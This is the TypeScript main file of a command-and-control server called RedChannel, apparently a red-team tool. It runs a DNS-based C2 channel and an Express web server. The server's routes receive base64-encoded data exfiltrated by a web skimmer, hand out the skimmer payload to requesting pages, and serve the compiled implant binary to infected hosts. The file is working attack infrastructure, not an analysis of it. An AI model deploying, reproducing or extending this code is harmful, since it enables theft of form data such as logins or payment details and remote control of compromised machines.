import chalk from "chalk";
import * as dnsd from "dnsd";
import * as fs from "fs";
import { Command } from "commander";

import RedChannel from "./lib/redchannel";
import UserInterface from "./lib/ui";
import Logger from "./lib/logger";
import { Config, Constants, emsg } from "./utils/utils";

const banner = `
██████╗ ███████╗██████╗  ██████╗██╗  ██╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██╗     
██╔══██╗██╔════╝██╔══██╗██╔════╝██║  ██║██╔══██╗████╗  ██║████╗  ██║██╔════╝██║     
██████╔╝█████╗  ██║  ██║██║     ███████║███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██║     
██╔══██╗██╔══╝  ██║  ██║██║     ██╔══██║██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██║     
██║  ██║███████╗██████╔╝╚██████╗██║  ██║██║  ██║██║ ╚████║██║ ╚████║███████╗███████╗
╚═╝  ╚═╝╚══════╝╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚══════╝
`;

const cli = new Command();
cli.version(Constants.VERSION, "-v, --version")
    .usage("[options]")
    .option("-c, --config <path/to/rc.conf>", "specify a redchannel config file", Config.DEFAULT_CONFIG_FILE)
    .option("-p, --password <password>", "specify the password or set via env:RC_PASSWORD")
    .option("-c, --domain <domain>", "specify the c2 domain", "")
    .option("-B, --ip [ip]", "bind dns c2 to ip", "")
    .option("-P, --port [port]", "listen for dns on a specific port", "")
    .option("-W, --web-ip [ip]", "bind web server to ip", "")
    .option("-Y, --web-port [port]", "listen for web on a specific port", "")
    .option("-I, --agent-interval [ms]", "check in interval for the agent", "")
    .option("-R, --agent-resolver [ip:port]", "set the resolver to use for the agent", "")
    .option("-d, --debug", "enable debug", false)
    .parse(process.argv);

const cliPassword = process.env.RC_PASSWORD ?? cli.getOptionValue("password");
// env password takes priority over commandline
if (!cliPassword) {
    new Logger().error("please specify a master c2 password via command-lie or environment variable, see '--help'");
    process.exit(1);
}

const cliDomain = cli.getOptionValue("domain");
const cliConfigFilePath = cli.getOptionValue("config");
const cliConfig = {
    c2: {
        dns_ip: cli.getOptionValue("ip") || "127.0.0.1",
        dns_port: Number(cli.getOptionValue("port")) || 53,
        web_ip: cli.getOptionValue("webIp") || "127.0.0.1",
        web_port: cli.getOptionValue("webPort") || 4321,
        interval: cli.getOptionValue("agentInterval") || 5000,
    },
    implant: {
        resolver: cli.getOptionValue("agentResolver") || "8.8.8.8:53",
    },
};

const cliDebug = cli.getOptionValue("debug") ?? false;

let redchannel: RedChannel;
try {
    redchannel = new RedChannel(cliDebug, cliDomain, cliConfig, cliPassword, cliConfigFilePath);
} catch (ex) {
    new Logger().error(`Error instantiating RedChannel: ${emsg(ex)}`);
    process.exit(1);
}

const ui = new UserInterface(redchannel);
redchannel.log = ui;

ui.msg(chalk.redBright(banner));
/**
 Web channel
 */
const webServer = require("express")();

webServer.listen(redchannel.config.c2.web_port, redchannel.config.c2.web_ip, (err) => {
    if (err) return ui.error(`failed to start web server: ${err}`);
    ui.info(`c2-web listening on: ${redchannel.config.c2.web_ip}:${redchannel.config.c2.web_port}`);
});

/**
 Skimmer routes
 */

// incoming skimmer data
webServer.get(redchannel.config.skimmer.data_route, (request, response) => {
    ui.debug(`incoming skimmer raw data: ${JSON.stringify(request.query)}`);

    const decodedData = Buffer.from(request.query.id, "base64").toString();
    ui.success(`incoming skimmer data: \n ${decodedData}`);
    response.send("OK");
});

// server skimmer payload
webServer.get(redchannel.config.skimmer.payload_route, (request, response) => {
    let ip = request.headers["x-forwarded-for"] || request.socket.remoteAddress;
    ui.warn(`incoming request for skimmer payload from ${ip}`);
    response.send(redchannel.modules.skimmer.payload);
});

// agent binary payload
webServer.get(redchannel.config.c2.binary_route, (request, response) => {
    let ip = request.headers["x-forwarded-for"] || request.socket.remoteAddress;
    ui.warn(`incoming request for agent binary from ${ip}`);
    try {
        if (!fs.existsSync(redchannel.config.implant.output_file)) throw new Error(`agent binary not found on disk, did you generate an implant?`);
        response.sendFile(redchannel.config.implant.output_file);
        ui.warn(`agent binary sent to ${ip}`);
    } catch (ex) {
        ui.error(`agent binary not sent to ${ip}, err: ${emsg(ex)}`);
        response.status(404).send("404 File Not Found");
    }
});

/**
 DNS channel
 */
const dnsServer = dnsd.createServer(redchannel.c2MessageHandler);
// prettier-ignore
dnsServer
    .zone(
        redchannel.config.c2.domain,
        "ns1." + redchannel.config.c2.domain,
        "root@" + redchannel.config.c2.domain,
        "now",
        "2h",
        "30m",
        "2w",
        "10m"
    )
    .listen(redchannel.config.c2.dns_port, redchannel.config.c2.dns_ip);

ui.info(`c2-dns listening on: ${redchannel.config.c2.dns_ip}:${redchannel.config.c2.dns_port}`);
